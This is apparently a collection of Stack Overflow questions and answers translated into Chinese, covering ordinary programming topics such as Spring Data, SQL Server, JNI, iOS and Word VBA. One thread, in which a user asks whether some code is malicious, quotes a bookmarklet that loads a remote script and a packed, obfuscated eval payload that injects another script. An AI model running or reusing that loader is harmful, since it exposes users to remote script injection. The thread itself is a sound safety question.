    cv::Mat dest;
    cv::inRange(crop, cv::Scalar(70, 90, 100), cv::Scalar(140, 140, 140), dest);
    cv::imwrite("colors_threshold.png", dest);

    cv::imshow("Example", dest);    
    cv::waitKey();

    return 0;
} 
```

# spring - spring data mongodb准备好生产了吗

> ID：15899801
> 
> 赞同：0
> 
> 时间：2013-04-09T10:43:16.167
> 
> 标签：spring, mongodb, spring-data, spring-data-mongodb

我看过 spring data 文档并尝试了一个小演示应用程序。我喜欢它，因为它易于使用。Mongodb 和 Spring Data 仍然可以说是相当新的技术，所以我担心它的成熟度，尽管我爱上了它的哲学。我知道我问的是非常相关的问题，但仍将不胜感激一些意见和经验分享：

*   spring data mongodb 继续开发的可能性有多大，而不是像 Spring Riak 那样被抛弃
*   弹簧数据有多错误？以及它得到修复的速度有多快？
*   spring data mongodb的趋势有多大，有没有在这个栈里开发过的正经的大生产app？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-09T10:59:18.887

我在多个应用程序中使用了 spring-data 和 mongodb。所有这些都是实时的，并且是面向客户的应用程序。我不能透露名字。

到目前为止，我还没有遇到任何关于弹簧数据的错误。

# c# - 访问以一列为基础选择为不同记录的第一条记录的所有字段

> ID：15899803
> 
> 赞同：0
> 
> 时间：2013-04-09T10:43:21.247
> 
> 标签：c#, asp.net, .net, datatable, dataset

我想要以一列为基础的不同记录。我使用以下方法。

```
dtUniqRecords = dt.DefaultView.ToTable(true, Columns); 
```

`ToTable`但实际上，我希望在我在方法中提到的那一列的基础上获得一个不同的记录。我希望选择的第一条记录应该显示它的其他列值。

例如：

```
PkID Name Column1 Column2 ...
221  null null null 
```

我希望结果像

```
221 test1   test2 test3 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T11:40:50.477

我不确定您是否可以对数据表执行类似的操作，但您始终可以将其转换为 List 并使用自定义比较器获取不同的值

```
 var dt = new DataTable();
    var dataList = (from DataRow row in dt.Rows
                select new SomeObject
                {
                    Id = Convert.ToInt32(row["Id"])
                }).ToList();

    dataList = dataList.Distinct(new SomeDistinctComparer()).ToList();

    public class SomeObject
    {
        public int Id { get; set; }
    }

    public class SomeDistinctComparer : IEqualityComparer<SomeObject>
    {
        public bool Equals(SomeObject x, SomeObject y)
        {
            return x.Id == y.Id;
        }

        public int GetHashCode(SomeObject obj)
        {
            return obj.Id.GetHashCode();
        }
    } 
```

# java - 更新 Jlabel 的新位置

> ID：15899805
> 
> 赞同：2
> 
> 时间：2013-04-09T10:43:24.863
> 
> 标签：java, swing, layout, jlabel, layout-manager

我是 Java 新手，我的作业遇到了一些麻烦。我有一个包含 100 个 JLabel 的面板：

```
for(int i=0;i<100;i++)
{
    num[i] = new JLabel(""+i, JLabel.CENTER);
    mainPanel.add(num[i]);
} 
```

以及单击时为标签设置图像图标的按钮

```
public void actionPerformed(ActionEvent ae)
{
    int a = ran.nextInt(6) +1;//random number

    int b +=a;            
    if(b>=100)
    {
        b=99;
        num[b].setIcon(icon);
    }
    else
    {                
        num[b].setIcon(icon);              
    }
} 
```

如何从最后一个位置删除图标并将其更新到新位置？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:50:10.220

您可以尝试记住您尝试为其设置图标的标签的`index`。`array`

例如-

```
int b = 0; // make b an instance variable

public void actionPerformed(ActionEvent ae)
{
    int a = ran.nextInt(6) +1;//random number
    num[b].setIcon(null); //remove the icon from from previously set label

    b=a;  //since b already has some value, b+=a might create unexpected result, hence just assigned a  
    if(b>=100)
    {
       b=99;
       num[b].setIcon(icon);
    }
    else
    {                
       num[b].setIcon(icon);
    }
} 
```

# sql-server - 忽略非字母数字字符的 SQL Server 2008 选择语句

> ID：15899806
> 
> 赞同：0
> 
> 时间：2013-04-09T10:43:28.220
> 
> 标签：sql-server, select, non-alphanumeric

我有一个有趣的 SQL Server 搜索需求。

假设我有一张带有零件编号的表格，如下所示：

```
PARTNO    DESCRIPTION
------    -----------
ABC-123   First part
D/12a92   Second Part 
```

如果我搜索“D12A”，如何创建一个返回结果的搜索？

我目前为描述列设置了全文搜索，但我希望找到与部件 no 匹配的部件，即使用户不包含 / 或 - 等。

如果可能，我宁愿在单个 SQL 语句中执行此操作，而不是创建函数，因为我们只有对 DB 的读取访问权限。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T12:22:20.277

您可以执行以下操作：

```
SELECT * FROM PART_TABLE
WHERE REPLACE(REPLACE(PARTNO,'/', ''),'-','') LIKE '%D12A%' 
```

这适用于您指定的 2 个字符，并且可以扩展为更多字符，如下所示：

```
SELECT * FROM PART_TABLE
WHERE REPLACE(REPLACE(REPLACE(PARTNO,'/', ''),'-',''),*,'') LIKE '%D12A%' 
```

除非您的特殊字符有限，否则可能不是最优雅的解决方案。否则，我建议编写一个函数来去除非字母数字字符。

以下是此类函数的示例：

```
CREATE FUNCTION dbo.udf_AlphaNumericChars
(
@String     VARCHAR(MAX)
)
RETURNS VARCHAR(MAX)
AS
BEGIN

  DECLARE @RemovingCharIndex INT
  SET @RemovingCharIndex = PATINDEX('%[^0-9A-Za-z]%',@String)

  WHILE @RemovingCharIndex > 0
  BEGIN
    SET @String = STUFF(@String,@RemovingCharIndex,1,'')
    @RemovingCharIndex = PATINDEX('%[^0-9A-Za-z]%',@String)
  END

  RETURN @String

END

------- Query Sample (untested)---------
SELECT *
FROM PART_TABLE
WHERE DBO.udf_AlphaNumericChars(PARTNO) LIKE '%D12A%' 
```

取自：http : [//sqlserver20.blogspot.co.uk/2012/06/find-alphanumeric-characters-only-from.html](http://sqlserver20.blogspot.co.uk/2012/06/find-alphanumeric-characters-only-from.html)

# c# - 使用不安全的方法比较两个图像数据

> ID：15899809
> 
> 赞同：2
> 
> 时间：2013-04-09T10:43:44.420
> 
> 标签：c#, wpf, unsafe

我正在编写一个函数来获取 Visual Studio 2010 中两个位图图像之间的差异。我有一个将两个位图图像作为参数的函数，我使用解锁位来获取每个像素的数据，两个图像的分辨率和尺寸都相同。

当我只对一个图像使用解锁位时，它工作得很好，但是当我在同一个函数中同时使用它时，它会给出一个异常

> 位图区域已锁定

**代码**：

```
 public Bitmap Invert(Bitmap b,Bitmap c)
    {

        BitmapData bmData = 
            b.LockBits(new System.Drawing.Rectangle(0, 0, b.Width, b.Height),
                       ImageLockMode.ReadWrite, 
                       System.Drawing.Imaging.PixelFormat.Format24bppRgb);

       int stride = bmData.Stride;
        System.IntPtr Scan0 = bmData.Scan0;

        // for image 2
       BitmapData data2 = 
           c.LockBits(new System.Drawing.Rectangle(0, 
                                                   0, 
                                                   c.Width,
                                                   c.Height),
                      ImageLockMode.ReadWrite,
                      System.Drawing.Imaging.PixelFormat.Format24bppRgb);

      int  stride1 = data2.Stride;
        System.IntPtr Scan1 = data2.Scan0;
        unsafe
        {
            byte* p = (byte*)(void*)Scan0;
            byte* q = (byte*)(void*)Scan1;
            nOffset = stride - b.Width * 3;
            nWidth = b.Width * 3;
            for (y = 0; y < b.Height; ++y)
            {
                for (x = 0; x < nWidth; ++x)
                {
                    p[0] = (byte)(p[0]-q[0]);
                    ++p;
                    ++q;
                }
                p += nOffset;
                q += nOffset;
            }
        }

        b.UnlockBits(bmData);
        c.UnlockBits(data2);
        return b;
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-31T06:16:07.023

因为你只需要比较图像，我建议只在阅读模式下打开它们，即：

```
BitmapData data2 =   c.LockBits(new System.Drawing.Rectangle(0, 
                                               0, 
                                               c.Width,
                                               c.Height),
                    ImageLockMode.ReadOnly,
                    System.Drawing.Imaging.PixelFormat.Format24bppRgb); 
```

# date - JPA：如何将包含日期的 VARCHAR 列映射为 DATE 格式？

> ID：15899811
> 
> 赞同：2
> 
> 时间：2013-04-09T10:43:45.623
> 
> 标签：date, jpa, eclipselink

我必须使用 JPA 从数据库中读取日期。我正在使用 EclipseLink 和 MySQL。日期作为 varchar(10) 以 YYYY-MM-DD 格式存储在数据库中。无法更改数据库列类型。有没有办法将此列映射到某些日期类型（日期、日历）？是否可以强制转换？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T13:42:55.040

使用 EclipseLink，您可以使用转换器。

见， [http://www.eclipse.org/eclipselink/documentation/2.4/jpa/extensions/a_converter.htm#CHDEHJEB](http://www.eclipse.org/eclipselink/documentation/2.4/jpa/extensions/a_converter.htm#CHDEHJEB)

一个简单的@TypeConverter 可能会起作用，否则您可以创建自己的转换器。

# android - Eclipse - 方法 NewStringUTF() 无法解析

> ID：15899813
> 
> 赞同：9
> 
> 时间：2013-04-09T10:43:50.880
> 
> 标签：android, opencv

我正在编写一个简单的 OpenCV 代码，以在进行 sobel 操作后显示图像。我已经包含了项目属性的所有必要路径以包含该`OpenCV4Android`文件夹。我解决了所有错误，除了一个：

错误：`Method NewStringUTF() could not be resolved`

我包括`<jni.h>`了我还在项目路径中包括了 AndroidNDK 文件夹。我的 Eclipse 是高度不可预测的。早些时候，当我在 Android 上开发其他应用程序时，它运行良好。eclipse机器依赖吗？我能做些什么来解决这个错误？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-07-11T11:36:30.673

您可能在文件中使用`C`语法`CPP`

我有同样的错误

只需切换到正确的语法，问题就会得到解决 **C 语法**

```
return (*env)->NewStringUTF(env, "Hello from JNI !"); 
```

**C++ 语法**

```
return (env)->NewStringUTF("Hello from JNI !"); 
```

从 C 语法切换到 C++ 语法后，我的问题得到了解决。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2013-04-19T18:47:17.200

我有这个问题。根据我的“解决方案”，Eclipse 中发生的事情似乎很有趣，因为我打开了另一个项目（据我所知）确切的一些属性、路径等，除了被标记为图书馆项目。

只需观察jhi.h中对应的struct，回调原型都在那里！按住 Ctrl 键单击 include 语句，Eclipse 甚至会链接您的引用！

转到项目的属性 -> C/C++ 常规 -> 代码分析。单击“使用项目设置”单选按钮（或“配置工作区设置...”按钮）。禁用（取消选中）“无法解决方法”复选框。单击“应用”、“确定”。然后为您的项目，刷新、清理、刷新、构建。

在创建新项目时，我一定做了*一些不同的事情。*或者可能是因为项目的位置，或者以前是图书馆的事实。也许它真的是一个 Eclipse 错误？作为参考，我在 Windows 上使用 ADT v21.1.0-569685 和 NDK r8e。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-06-13T18:37:44.170

```
JNIEXPORT jstring JNICALL Java_com_example_faceextractiontest_Makeover_hello(JNIEnv* env, jobject obj){
const char* c = "hello how are you i am ahmad raza";
jstring s = env->NewStringUTF(c);

return s;
} 
```

这对我有用

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-01-12T09:13:40.797

*   第 1 步：项目属性 -> C/C++ 常规 -> 路径和符号

*   第 2 步：选择“包含”选项卡，添加 -> $ANDROID_NDK_HOME/platforms/android-19/arch-arm/usr/include(您自己的路径)，然后选中“所有语言”

*   第 3 步：申请 -> 确定

而已。我的解决方案。

# iphone - Safari 网络浏览器无法使用 URL 打开

> ID：15899817
> 
> 赞同：0
> 
> 时间：2013-04-09T10:43:59.773
> 
> 标签：iphone, ios, objective-c, xcode, cocoa-touch

我是 iPhone 开发的新手。我有 6 个部分的表格视图，每个部分有一行，在第 4 部分我添加了 UILabel。此 UILabel 文本是 URL (www.google.com)。当我单击此标签时，我想打开 safari，但我没有成功打开 safari

我用 UITableViewCell 内的超链接关注这个[UILabel 应该打开 safari 网络浏览器吗？](https://stackoverflow.com/questions/5928868/uilabel-with-a-hyperlink-inside-a-uitableviewcell-should-open-safari-webbrowser)

但它不起作用。

**我的代码：**

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{

    NSString *CellIdentifier = [NSString stringWithFormat:@"S%1dR%1d",indexPath.section,indexPath.row];
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if(cell == nil)
    {
        cell = [[[UITableViewCell alloc]initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier] autorelease];
        cell.selectionStyle = UITableViewCellSelectionStyleNone;
        cell.backgroundColor = [Prep defaultBGColor];

        if(indexPath.section == 3)
        {
            self.lblWebsite = [[UILabel alloc]initWithFrame:CGRectMake(10, 5, 270, 35)];
            self.lblWebsite.backgroundColor = [UIColor clearColor];
            self.lblWebsite.text= @"www.gmail.com";
            self.lblWebsite.font =[UIFont fontWithName:@"Arial-BoldMT" size:16];
            self.lblWebsite.textAlignment = UITextAlignmentLeft;
            self.lblWebsite.userInteractionEnabled = YES;
            self.lblWebsite.textColor=[UIColor blackColor];
            [cell.contentView addSubview:self.lblWebsite];

            UITapGestureRecognizer *gestureRec = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(openUrl:)];
            gestureRec.numberOfTouchesRequired = 1;
            gestureRec.numberOfTapsRequired = 1;
            [self.lblWebsite addGestureRecognizer:gestureRec];
            [gestureRec release];
       }
    }
  return Cell;
} 
```

**方法**

```
- (void)openUrl:(id)sender
{

    UIGestureRecognizer *rec = (UIGestureRecognizer *)sender;

    id hitLabel = [self.view hitTest:[rec locationInView:self.view] withEvent:UIEventTypeTouches];

    if ([hitLabel isKindOfClass:[UILabel class]]) {
         NSLog(@"%@",((UILabel *)hitLabel).text);
        [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"www.google.com"]];
    }
} 
```

这是我的错误吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:51:23.340

```
 [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"http://www.google.com"]]; 
```

你失踪了“ `http://`”

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-09T10:51:31.240

你做得对，但我认为之前使用`http://`过`www.google.com`

```
NSURL *url = [NSURL URLWithString:@"http://www.stackoverflow.com"];

if (![[UIApplication sharedApplication] openURL:url])

NSLog(@"%@%@",@"Failed to open url:",[url description]); 
```

我认为它可能对你有用

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T11:07:56.957

只需添加“http://”即可使用示例：-

```
[[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"http://www.facebook.com"]]; 
```

# arrays - 从数组集合中检索特定索引

> ID：15899819
> 
> 赞同：0
> 
> 时间：2013-04-09T10:44:08.830
> 
> 标签：arrays, apache-flex, flexbuilder

我似乎无法解决这个问题。我想显示一个从 arraycollection 中的特定位置开始的列表，而不更改数组。目标是拥有一组用户可以滑动浏览的全屏图像（就像在电子书中一样），对于章节索引，我想从 arraycollection 中的特定索引号开始。

有没有一种简单的方法来告诉 Itemrenderer 从 arraycollection 中的特定索引号开始。

我的代码从索引 0 开始：

```
<s:List id="pagedList"
        width="100%" height="100%"
        verticalScrollPolicy="off" horizontalScrollPolicy="on"
        pageScrollingEnabled="true">

    <s:layout>
        <s:TileLayout orientation="rows" requestedRowCount="1" 
                      columnWidth="{pagedList.width}" rowHeight="{pagedList.height}" 
                      verticalGap="0" horizontalGap="0"/>
    </s:layout>
    <s:ArrayCollection id="contentData">
        <s:Image source="assets/cover.jpg"/>
        <s:Image source="assets/introduction.jpg"/>
        <s:Image source="assets/H1/40_days.jpg"/>
    </s:ArrayCollection>
    <s:itemRenderer>
        <fx:Component>
            <s:ItemRenderer>
                <s:Group>
                    <s:Image source="{data.source}" horizontalAlign="center"/>
                </s:Group>
            </s:ItemRenderer>
        </fx:Component>
    </s:itemRenderer>  
</s:List> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T11:04:55.120

AFAIK 没有办法做到这一点。您必须对 dataprovider 进行排序，使其与您希望显示项目的顺序相匹配。

如果您不想修改原始集合，您可以创建一个[ListCollectionView](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/mx/collections/ListCollectionView.html)，将原始集合传递给构造函数并为 ListCollectionView 添加排序。然后，您可以将集合视图指定为列表的数据提供者。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T15:09:35.443

这一切都始于您的数据。数据本身将需要包含有关章节偏移的信息。通常，您将存储偏移搜索点的集合。

例如：

```
Pages:     1 2 3 4 5 6 7 8 9 10 11 12 13 14 15
Chapters:  1     2       3   4        5 
```

章节对象将保存对从哪个页面开始及其总长度的引用。一组搜索按钮将遍历一个章节集合，告诉您的列表从适当的偏移量开始（即第 2 章，从索引 4 开始，长度为 4 项）。

您的页面对象可以是单个图像，也可以是每页图像的集合。无论哪种情况，从数据的角度来看，您真正构建的是分层集合。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T12:20:26.430

如果您的目标是首先显示特定图像，为什么不为列表本身设置 selectedIndex。我的意思是在 dataprovider 中给你的数据对象一些 id 并将索引传递给列表。希望这有帮助，如果这不是预期的，请告诉我

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-10T20:22:09.290

`ensureIndexIsVisible`Spark List 上的方法可能有效吗？

注意：您可能需要单击以下 html 页面顶部的“产品”复选框才能实际看到此方法。

[http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/spark/components/List.html#ensureIndexIsVisible()](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/spark/components/List.html#ensureIndexIsVisible())

# vba - 使用样式格式化文件中的所有表格

> ID：15899820
> 
> 赞同：1
> 
> 时间：2013-04-09T10:44:20.140
> 
> 标签：vba, ms-word

我目前正在处理某种文档，其中包含大量表格。正如你现在可能已经猜到的那样，我需要用某种风格来格式化它们。因此，有一个专门为此目的制作的 VBA 宏 - 它创建所需的样式，然后将其应用于文件中的所有表。但是现在，当我处理大型文档时，这似乎是一个问题。所以，让我们看看工作代码，省略部分，创建样式：

```
Dim oTable As Table
For Each oTable In ActiveDocument.Tables
oTable.Select
Selection.Tables(1).ApplyStyleDirectFormatting ("FooStyle")
Selection.Tables(1).AutoFitBehavior (wdAutoFitFixed)
Selection.Tables(1).ApplyStyleRowBands = True
With Selection.Tables(1).Borders
    .InsideLineStyle = wdLineStyleSingle
    .InsideLineWidth = wdLineWidth025pt
    .OutsideLineStyle = wdLineStyleSingle
    .OutsideLineWidth = wdLineWidth025pt
End With

'Make a list for last row of the table
Selection.Tables(1).Cell(Row:=8, Column:=1).Range.Select
Selection.Range.ListFormat.ApplyListTemplate ListTemplate:=ListGalleries(wdOutlineNumberGallery).ListTemplates(2)
Next 
```

因此，此代码适用于少于 600 页的文档。否则它会停在行

```
.InsideLineStyle = wdLineStyleSingle 
```

运行时错误 4605 讲述有关内存和磁盘空间的故事。我做了一些研究，发现[这个很棒的线程](http://www.tek-tips.com/viewthread.cfm?qid=1525289)讲述了选择的缺点。然后遵循给定的建议并稍微更改宏的代码，结果如下：

```
Dim lTbl As Long
For lTbl = 1 To ActiveDocument.Tables.Count
ActiveDocument.Tables(lTbl).ApplyStyleDirectFormatting ("BarStyle")
ActiveDocument.Tables(lTbl).AutoFitBehavior (wdAutoFitFixed)
ActiveDocument.Tables(lTbl).ApplyStyleRowBands = True
With ActiveDocument.Tables(lTbl).Borders
    .InsideLineStyle = wdLineStyleSingle
    .InsideLineWidth = wdLineWidth025pt
    .OutsideLineStyle = wdLineStyleSingle
    .OutsideLineWidth = wdLineWidth025pt
End With

'Make a list for last row of the table
ActiveDocument.Tables(lTbl).Cell(Row:=8, Column:=1).Range.ListFormat.ApplyListTemplate ListTemplate:=ListGalleries(wdOutlineNumberGallery).ListTemplates(2)
Next 
```

是的，令人毛骨悚然的长线。不，没有任何改变。似乎没有更多的选择，但在同一个地方仍然出现同样的错误。因此，我尝试更改出现错误时调试器停止的部分：

```
For Each oCell In ActiveDocument.Tables(lTbl).Range.Cells
    oCell.Borders.OutsideLineStyle = wdLineStyleSingle
    oCell.Borders.OutsideLineWidth = wdLineWidth025pt
    Next 
```

无济于事-仍然遇到同样的问题。在这一点上，我决定做一些实验并在代码的最后一行（那个 long-a** 行）旁边删除......瞧 - 宏就像一个魅力，没有错误，没有抱怨，什么都没有。出于争论的原因，我尝试对这个宏的第一个版本进行相同的更改，结果是相同的 - 似乎一直是那条线的错。所以像这样离开它不是一个解决方案，因为最后一行的编号列表是必须的。那么，这个宏应该怎么做才不会弹出这个错误呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T13:00:48.120

这种问题可以通过将任务分成两个循环来解决。第一次迭代将更改表格格式。第二次迭代将`ListFormat`在预期的地方添加。

当然，结果是我们得到了较慢的子程序，但最终我们得到了我们需要的东西。

# javascript - 这个 javascript 代码有什么作用？它是恶意的吗？

> ID：15899836
> 
> 赞同：1
> 
> 时间：2013-04-09T10:45:08.550
> 
> 标签：javascript

有人要求我在浏览器中执行以下操作：

```
javascript:(function(){document.body.appendChild(document.createElement('script')).src='http://xyz.com/new2.js';})(); 
```

当我下载 new2.js 文件查看它时，它包含以下内容：

```
eval(function(p,a,c,k,e,r)
{
 e=function(c)
 {
  return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))
 }
 ;
 if(!''.replace(/^/,String))
 {
  while(c--)r[e(c)]=k[c]||e(c);
  k=[function(e)
  {
   return r[e]
  }
  ];
  e=function()
  {
   return'\\w+'
  }
  ;
  c=1
 }
 ;
 while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);
 return p
}
('1H(1A(p,a,c,k,e,r){e=1A(c){1B(c<a?\'\':e(1I(c/a)))+((c=c%a)>35?1C.1D(c+29):c.1J(36))};1E(!\'\'.1F(/^/,1C)){1G(c--)r[e(c)]=k[c]||e(c);k=[1A(e){1B r[e]}];e=1A(){1B\'\\\\w+\'};c=1};1G(c--)1E(k[c])p=p.1F(1K 1L(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);1B p}(\'f G="H%g%u%1%9%1%b%b%c%1%I%J%1%3%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%v%1%9%u%1%1%1%1%K%L%M%N%O/P%1%3%1%1%1%1%1%1%1%1%1%1%1%d%7%3%3%1%1%1%1%1%1%1%1%1%1%1%h%1%9%j%3%1%1%1%1%1%1%1%1%1%1%1%7%w%x%j%c%3%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%Q%R%e%4%5%1%1%1%1%1%1%S%T%U%V%W%X%Y%Z%1%1%1%1%1%1%1%1%1%1%1%1%3%1%1%1%1%1%1%1%1%1%1%1%d%7%3%3%1%1%1%1%1%1%1%1%1%1%1%7%8%x%j%c%3%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%8%1%9%y%k/10%3%1%1%1%1%1%1%1%1%1%1%1%d%7%3%1%1%1%1%1%1%1%1%1%1%1%7%8/6/l%a%4%5%11%g%m%1%9%1%n%b%c%3%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%z/6%a%4%5/12/o%e%4%5%3%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%z/6%a%4%5/13/o%e%4%5%3%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%8/6%a%4%5/o%e%4%5%3%1%1%1%1%1%1%1%1%1%1%1%A%m%1%9%1%n%b%c%3%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%7%8/6/l%e%n%b%4%5%c%3%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%8/6/14%B/6%a%4%5%4%5%3%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%8/6/C%a%4%5%3%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%d%7%3%1%1%1%1%1%1%1%1%1%1%1%A%g%8/6/l%a%4%5%c%3%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%8/6/C%15%k/16%a%4%5%4%5%3%1%1%1%1%1%1%1%1%1%1%1%d%7%3%1%1%1%1%1%1%1%1%1%1%1%h%1%9%y%k/17/18%19%D%w%4%5%3%1%1%1%1%1%1%1%1%1%1%1%h/1a%B%D%m%4%5%3%1%1%1%1%1%1%1%1b%E%1c%1d%3%1%1%1%1%1%1%1%1%1%1%1%1e%E%3%1%1%1%1%1%1%1%1f%3%1%1%1%1%1%1%1%1%1%1%1%v%1%9%1%b%b%3%1%1%1%1%1%1%1%d%1g";f p="1h--1i/1j,1k`q,1l-1m/1n,1o";r="";s="";f t;t=p.1p;1q(i=0;i<t;i++){r+=1r.1s(p.1t(i)^2)}s=1u(r);F.1v.1w(F.1x(\\\'1y\\\')).1z=s;\',1M,1N,\'|1O||1P|1Q|1R|1S|1T|1U|1V|1W|1X|1Y|1Z|20|21|22|23||24|25|26|27|28|2a|2b||2c|2d|2e|2f|2g|2h|2i|2j|2k|2l|2m|2n|2o|2p|2q|2r|2s|2t|2u|2v|2w|2x|2y|2z|2A|2B|2C|2D|2E|2F|2G|2H|2I|2J|2K|2L|2M|2N|2O|2P|2Q|2R|2S|2T|2U|2V|2W|2X|2Y|2Z|30|31|32|33|34|37|38|39|3a|3b|3c|3d|1C|1D|3e|3f|3g|3h|3i|3j|3k\'.3l(\'|\'),0,{}))',62,208,'||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||function|return|String|fromCharCode|if|replace|while|eval|parseInt|toString|new|RegExp|62|98|2631|261B|263|3A|Ubcmft|2631Jg|2631et|264E|2639ubcmfobnf|2633|2631Uifo|2631Foe|2639|var|2631Opu|2631eb|2631Opuijoh|2631Ebub|Dpoubjot|2631ubcmfobnf|2633SFQPSU||Dmfbs|enkripsi|teks|teksasli|panjang|2631rsztus|2631rsz|2631do|2631Jt|2631Ofx|2638et|2631FmtfJg|2639et|Bee|263D|2631fy|document|thisisthemainstringofThisScript|Jg|2638fyqmjdju|2631wbsjbcmf|2638bttjho|2631rvfsz|2631tusjoh|2631up|2631dpoofdu|rsz|2631Dbmm|2631joj|2638jg|2631DPOOFDUJPO|2631opu|2631jojujbmj|7Bfe|2631uifo|2631ep|2631ju|EbubTfu|2631Boe|Spxt|Dpmvnot|Sfnpwf|2639Ofx|EbubUbcmf|PmfEc|PmfEcEbubBebqufs|2639rsz|Gjmm|2631Dbudi|2631Bt|2631Fydfqujpo|2631Uispx|2631Gjobmmz|2631Usz1|jvvr8|hkeq|apgcvkmlq|||ug|amo|epmwr|cffgp|hq|length|for|charCodeAt|unescape|body|appendChild|createElement|script|src|split'.split('|'),0,
{
}
)) 
```

在尝试使用它之前，我想知道它在他在我的浏览器中执行一些恶意代码时会做什么。我如何破译发生了什么？我对 javascript 非常熟悉，但我无法弄清楚这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:52:29.357

[它与这个问题](https://stackoverflow.com/questions/2939421/what-is-this-weird-script-i-found-on-facebook?rq=1)中的脚本相同，不是吗？在那里回答的人得出的结论是它是恶意代码，所以最好不要执行它。

**编辑** 它不是相同的代码，但共享它的一部分。尽管如此，它仍然是恶意的。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-04-09T10:48:38.333

在某种沙盒虚拟机中运行它或尝试一些在线 javascript 应用程序，如[jsfiddle](http://jsfiddle.net/)。

恶意代码通常被编码成这种乱码，无法如此清楚地显示它的真正作用。

# c# - MVC4 Razor - 将 foreach 循环中的对象 ID 绑定到循环外的 Url.Action

> ID：15899838
> 
> 赞同：0
> 
> 时间：2013-04-09T10:45:21.430
> 
> 标签：c#, jquery, asp.net-mvc, razor, asp.net-mvc-4

我不确定这是否可以完成，因为它`Url.Action()`正在尝试访问仅在 foreach 范围内的变量 - 也许使用 jQuery？

我有一个强类型的局部视图，它采用包含搜索结果列表的视图模型。

我遍历列表，每个结果都以汇总形式显示。在列表中的每个项目旁边都有一个按钮（*应该*），单击该按钮会启动一个模式窗口，该窗口显示有关列表项目的更多详细信息。因此，如果列表中有 10 个项目，则将有 10 个相应的“更多信息”按钮。

**局部视图：**

```
<div>
@foreach (var result in Model.SearchResults)
{
    <div class="basic-search-result">
        <div class="row-fluid">
            <img class="span3" src="http://some-img.jpg" />
            <div class="span3">
                <div class="address">
                    @result.Address.TownCity<br />@result.Address.County
                </div>
                <div>
                    €@result.MonthlyRate Monthly
                </div>
            </div>
            <div class="span3 offset1" id="basic-search-result-btns">
                <button class="btn btn-primary btn-block" id="btn-show-modal-from-get-all">More info</button>
            </div>
        </div>
    </div>
}
</div> 
```

在 foreach 循环下方，我定义了模态（`ViewProperty`是一个控制器动作，它返回包含模态主体的部分）：

```
<div class="modal hide fade in" id="modal-view-property-from-get-all" 
    data-url="@Url.Action("ViewProperty", "ResidentialProperties", new { id = result.ResidentialPropertyId })">
    <div id="view-property-from-get-all-container"></div>
</div> 
```

单击其中一个按钮时，它应该启动一个模式。像这样处理：

```
<script type="text/javascript">
$(document).ready(function () {
    $('#btn-show-modal-from-get-all').click(function () {
        var url = $('#modal-view-property-from-get-all').data('url');

        $.get(url, function (data) {
            $('#view-property-from-get-all-container').html(data);

            $('#modal-view-property-from-get-all').modal('show');
        });
    });
}); 
```

我知道我在其中绑定的 Id`Url.Action()`超出了 foreach 的范围。是否有可能在单击按钮时以某种方式获取`result.ResidentialPropertyId`并将其动态传递给？`Url.Action()`

为了证明它的工作，我将它放在`Url.Action()`foreach 循环中，但这只是为列表中的第一项启动了一个模式。我想做的事能实现吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:54:46.910

不包括`Id`在`data-url`

```
<div class="modal hide fade in" id="modal-view-property-from-get-all" 
    data-url="@Url.Action("ViewProperty", "ResidentialProperties")">
    <div id="view-property-from-get-all-container"></div>
</div> 
```

使用该代码，`data-url`将有一个值`ResidentialProperties/ViewProperty`。

然后将`Id`每一行的 包含在您的按钮中，或者您可以从它的容器元素中读取它。我还建议您删除按钮的 id，也许只使用一个类来确保不会为您的按钮的所有实例执行 ajax 调用

```
// assuming Id is the identifier per row
<button class="btn btn-primary btn-block show-modal" 
